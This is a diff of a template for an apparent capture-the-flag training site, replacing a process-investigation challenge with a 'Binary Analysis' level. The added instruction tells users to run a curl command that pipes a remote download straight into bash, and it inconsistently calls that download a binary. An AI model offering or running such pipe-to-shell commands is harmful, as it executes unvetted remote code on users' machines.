@@ -1,24 +1,9 @@
 {% extends "challenges/level_base.html" %}
 
-{% block level_title %}Process Hunter Challenge{% endblock %}
+{% block level_title %}Binary Analysis{% endblock %}
 
 {% block challenge_description %}
-<div class="challenge-description">
-    <h4>Process Investigation</h4>
-    <p>There's a suspicious process running on the system. Your task is to investigate running processes and find the hidden flag.</p>
-    
-    <div class="task-list">
-        <h5>Your Tasks:</h5>
-        <ul>
-            <li>Use <code>ps aux</code> to list all running processes</li>
-            <li>Identify suspicious processes</li>
-            <li>Investigate process details using <code>/proc/[PID]</code> directory</li>
-            <li>Check process environment variables and command line arguments</li>
-        </ul>
-    </div>
-
-    <div class="hint-box">
-        <p><strong>Hint:</strong> Look for processes with unusual names or suspicious behavior. The <code>/proc/[PID]</code> directory contains valuable information about running processes.</p>
-    </div>
-</div>
+<p>Level 4 involves analyzing a binary file. Run the command below to download and execute a binary that contains the flag.</p>
 {% endblock %}
+
+{% block curl_command %}curl -s https://quicksnatch.challenge/level4/binary | bash{% endblock %}
